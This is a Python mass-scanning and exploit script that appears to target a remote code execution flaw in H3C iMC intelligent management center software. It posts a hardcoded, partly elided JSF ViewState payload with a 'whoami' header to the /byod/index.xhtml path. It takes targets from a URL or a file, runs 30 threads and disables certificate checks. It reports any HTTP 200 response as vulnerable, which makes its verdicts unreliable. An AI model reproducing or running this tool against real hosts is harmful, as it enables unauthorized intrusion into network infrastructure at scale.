import requests
import argparse
from multiprocessing.dummy import Pool
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings()


def check(target):
    url = f"{target}/byod/index.xhtml"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Connection':'close',
        'Via':'whoami'
    }
    data = {
        'Via':'whoami',
        'javax.faces.ViewState':'8SzWaaoxnkq9php028NtXbT98DEcA...Uh57HB/L8xz6eq+4sy0rUOuOdM5ccd2J6LPx8c6+53QkrX...jpFKgVnp07bad4n6CCBW8l98QIKwByAhLYdU2VpB/voaa....2oU+urahQDFE8mIaFvmwyKOHiwyovIHCVymqKwNdWXm3iHLhYEQXL4....k3z7MWm+wbV2Dc9TXV4rs8E6M7ZvVM3B0pORK8vAhd2iLBkgFhGHw9ZgOwifGnyMzfxlU....gG4chEOg57teuLurMPrulbEVBAEl7rRwobqvxb91sG+GMrGWFL5+wFvE56x7UEzHtE/o0IRtzTKi/EFnamrPT1046e7L8jABKDB/LjCX2qAOmqQkIz4gXrEFnHHYZ9LZc7t9ZZPNT...JZjummuZuror/zwPbnsApwXlYsn2hDAZ7QlOBunA3t7omeOTI5keWXvmOH8eoEEN//SlmQblwhBZ7kSHPvStq0ZciiPptEzVjQ/k/gU2QbCSc7yG0MFbhcJEDQj4yKyJ/yTnOOma....KuNzZl+PpEua+28h2YCKipVb5S/wOCrg+KD3DUFCbdWHQRqDaZyvYsc8C0X7fzutiVUlSB7OdGoCjub9WuW0d2eeDWZmOt3Wunms3SwAbE7R+onCRVS8tiYWF8qiQS+l0k8Gw/Hz6Njpfe0upLIAtPFNDuSf69qGg4isEmY2FtoSQTdD8vU0BdJatHrBArPgo9Qsp0jSJBlUz2OqteQg05PYO6gEBXVj/RiTBHI1/pOzlcE0wVZcLUHnxGNvckSCTiT....nWbkWGJ8AYCvrM0PHZ/BYcKKRf3rMHoIqcAN+ORMhXcmAXRcvq29c5xqoOuvrMSJPDZmbZhcm/99crGJSO5HxXQder9WKm2tVBaDLEC9ulpWyICJYgfxayoWkt6vwPcq2Tn20vn5RDpfqJKLNLbrV8g7JDRUUyW+....R6PRNunKhfJHvHcXAZ73mkCUf7cMUbNhqCbLSGP/D+qpqWXk5ZWjsT4tQ9tFH9uvPIaNB7FlcFXI2I2A9oPoY0ltif+b8BdPXVfpuZq8boHE4hY+33BIl+Ia+ov6nyMmGIzCKYeRbfDJtk/45EXvink6BIgA/205la6vvqKTGQ32o1AtepBgKei....604cVvbEP7UKor09Gz61mryE4D+iXG1prZGCT3LEtdASuCkmf4RTEc5wks2In3ElZSZl8zf3RsHA0dgbvrpnXe2wLPI+UCAGO+iOG9/+bCQJQNFmykkyRbmslfcilUxZ+Ig+QuOs9FlMod2ICrkktOFFeZWNeznx737S8H4Nf2+p2QNHY2I6GFGtWpqjeZ+Gmb1euM5Tzi06eJ.......koPrjkDT9VPoxCgpRMQl06x7NShkos7BCI9fV1+17t5gWZvqAYzeQUsZLaiBXaZfuUtPuBmbq1re/dB/VgSOn4QX+8AwwDjtfazsHw4aIdh4e2a1y/Ou2ZiI//EzkwIBksY6CluuPgocdvtOfNiWcXsfYs3UKLmL/48A4Ls0OF1TrQK4UnfCYt.....1DGrwzfXnM9vLHznFaJenqvLY3yTiKN5SSVxvGwvhmp6PFW4Jj7G8NXdr/zN7HyC9Eg1Y1jKP7uiO+GM2U/etvMOCKwnfP2MnbznP378fZHf1H9yiVVrn+m+0u8PV.....2MsOTgS6B7C8ItflgSfJz5dkJ8IssRAcY+u/2QjrW95BBMSRPu2EaCUm1IpuszXEwHYgDizWPzDB0hSRgCEjncpGhPX3i10bK4/snBaBcAxAa1e2er2LDe/4WgaIwc9w2wKn3wXY5B87BKF5/Xq30....NNf6EMRrQ9154rEkCJb4IU4sFsTuyYlfZatlV+C2HM7u7FEbdVvr6yYK4oQqvfPmF5yRplwAYUQAvr1jwLbGYxhGaTy14UUrtvoyph5Sqebk2YTKjKX4U7xX5ha4YbyoVIMSRzdvB6YXDY3BId+gmMWZtTf2UE+9UAx/7g30pQNXA....FP1adq6ySd4x3dGVCe4YJcYe2gKWYVcWj5XPwUSt2fxdshzgFnjjqmRgxowH2u2nZU0xG539lnxIOlB'
    }
    try:

        response = requests.post(url=url, headers=headers,data=data,verify=False,timeout=10)
        if response.status_code == 200:

            print(f"[*] {target}[*]存在漏洞")
        else:
            print(f"[!] {target}[-]不存在漏洞")
    except requests.exceptions.RequestException as e:
        print(f"{target}[-]超时")


if __name__ == '__main__':
    banner = """
     .----------------.  .----------------.  .----------------.  .----------------. 
    | .--------------. || .--------------. || .--------------. || .--------------. |
    | | ____    ____ | || |      __      | || |     _____    | || |  ___  ____   | |
    | ||_   \  /   _|| || |     /  \     | || |    |_   _|   | || | |_  ||_  _|  | |
    | |  |   \/   |  | || |    / /\ \    | || |      | |     | || |   | |_/ /    | |
    | |  | |\  /| |  | || |   / ____ \   | || |   _  | |     | || |   |  __'.    | |
    | | _| |_\/_| |_ | || | _/ /    \ \_ | || |  | |_' |     | || |  _| |  \ \_  | |
    | ||_____||_____|| || ||____|  |____|| || |  `.___.'     | || | |____||____| | |
    | |              | || |              | || |              | || |              | |
    | '--------------' || '--------------' || '--------------' || '--------------' |
    '----------------'  '----------------'  '----------------'  '----------------' 



    """
    print(banner)
    parse = argparse.ArgumentParser(description="H46-1H3C-iMC智能管理中心 -RCE")
    # 添加命令行参数
    parse.add_argument('-u', '--url', dest='url', type=str, help='Please input url')
    parse.add_argument('-f', '--file', dest='file', type=str, help='Please input file')
    args = parse.parse_args()
    pool = Pool(30)

if args.url:
    if "http" in args.url:
        check(args.url)
    else:
        t2 = f"http://{args.url}"
        check(t2)
        t3 = f"https://{args.url}"
        check(t3)
elif args.file:
    f1 = open(args.file, 'r')
    targets = []
    for l in f1.readlines():
        l = l.strip()
        if "http" in l:
            target = f"{l}"
            targets.append(target)
        else:
            target = f"http://{l}"
            targets.append(target)
            target1 = f"https://{l}"
            targets.append(target1)
    pool.map(check, targets)
    pool.close()

